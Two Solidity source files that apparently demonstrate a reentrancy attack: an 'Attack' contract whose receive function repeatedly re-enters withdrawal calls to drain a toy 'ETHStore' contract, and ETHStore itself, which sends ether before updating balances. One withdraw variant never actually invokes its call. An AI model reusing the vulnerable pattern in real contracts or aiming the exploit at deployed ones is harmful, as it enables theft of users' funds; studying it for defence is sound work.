// SPDX-License-Identifier: GPL-2.0-or-later



pragma solidity 0.7.6;
import "./ETHStore.sol";

contract Attack {
    ETHStore public ethStore;
    bool public fun = true;

    constructor(address payable _ethStore) {
        ethStore = ETHStore(_ethStore);
    }

    function setFun() public {
        fun = !fun;
    }

    function pwnEthStore() public payable {
        ethStore.deposit{ value: msg.value }();
        if (fun) {
            ethStore.withdraw(1 ether);
        } else {
            ethStore.withdraw1(1 ether);
        }
    }

    function deposit() public payable {
        ethStore.deposit{ value: msg.value }();
    }

    function withdraw6() public payable {
        if (fun) {
            ethStore.withdraw(1 ether);
        } else {
            ethStore.withdraw1(1 ether);
        }
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {
        if (msg.sender == address(ethStore)) {
            if (fun) {
                if (address(ethStore).balance >= 1 ether) {
                    ethStore.withdraw(1 ether);
                }
            } else {
                if (address(ethStore).balance >= 1 ether) {
                    ethStore.withdraw1(1 ether);
                }
            }
        }
    }
}

// SPDX-License-Identifier: GPL-2.0-or-later



pragma solidity 0.7.6;

contract ETHStore {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 indexed amount);

    event Withdraw(address indexed user, uint256 indexed amount);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "balance not En");
        msg.sender.call{ value: amount };
        balances[msg.sender] -= amount;
        emit Withdraw(msg.sender, amount);
    }

    function withdraw1(uint256 amount) public {
        require(balances[msg.sender] >= amount, "balance not En");
        msg.sender.call{ value: amount }("");
        balances[msg.sender] -= amount;
        emit Withdraw(msg.sender, amount);
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {}

    fallback() external {}
}